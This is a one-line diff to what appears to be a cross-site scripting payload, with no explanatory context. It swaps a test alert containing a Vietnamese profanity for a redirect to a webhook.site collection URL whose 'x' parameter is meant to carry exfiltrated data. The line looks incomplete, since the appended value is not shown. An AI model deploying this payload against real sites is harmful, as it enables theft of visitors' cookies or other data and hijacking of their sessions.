@@ -1,1 +1,1 @@
-alert('concac')
+location.href = "http://webhook.site/a18dafbc-8a62-49f8-95dc-9eec735f9a8e/?x="
